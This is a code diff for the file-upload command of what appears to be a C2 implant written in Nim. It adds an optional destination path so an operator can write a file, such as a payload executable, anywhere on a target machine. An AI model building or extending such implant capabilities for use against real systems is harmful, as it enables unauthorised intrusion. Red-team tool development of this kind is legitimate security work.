@@ -27,6 +27,7 @@ let module* = Module(
             example: protect("upload /path/to/payload.exe"),
             arguments: @[
                 Argument(name: protect("file"), description: protect("Path to file to upload to the target machine."), argumentType: BINARY, isRequired: true),
+                Argument(name: protect("destination"), description: protect("Path to upload the file to. By default, uploads to current directory."), argumentType: STRING, isRequired: false),
             ],
             execute: executeUpload
         )
@@ -40,7 +41,7 @@ when not defined(agent):
 
 when defined(agent):
 
-    import os, std/paths, strformat
+    import os, strformat
     import ../agent/utils/io
     import ../agent/protocol/result
     import ../common/serialize
@@ -72,17 +73,18 @@ when defined(agent):
         try: 
             var arg: string = Bytes.toString(task.args[0].data) 
 
-            print arg
-
             # Parse binary argument
             var unpacker = Unpacker.init(arg) 
-            let 
-                fileName = unpacker.getDataWithLengthPrefix() 
+            var 
+                destination = unpacker.getDataWithLengthPrefix() 
                 fileContents = unpacker.getDataWithLengthPrefix() 
 
+            # If a destination has been passed as an argument, upload it there instead
+            if task.argCount == 2: 
+                destination = Bytes.toString(task.args[1].data)
+        
             # Write the file to the current working directory
-            let destination = fmt"{paths.getCurrentDir()}\{fileName}"
-            writeFile(fmt"{destination}", fileContents)
+            writeFile(destination, fileContents)
 
             return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"File uploaded to {destination}."))
 
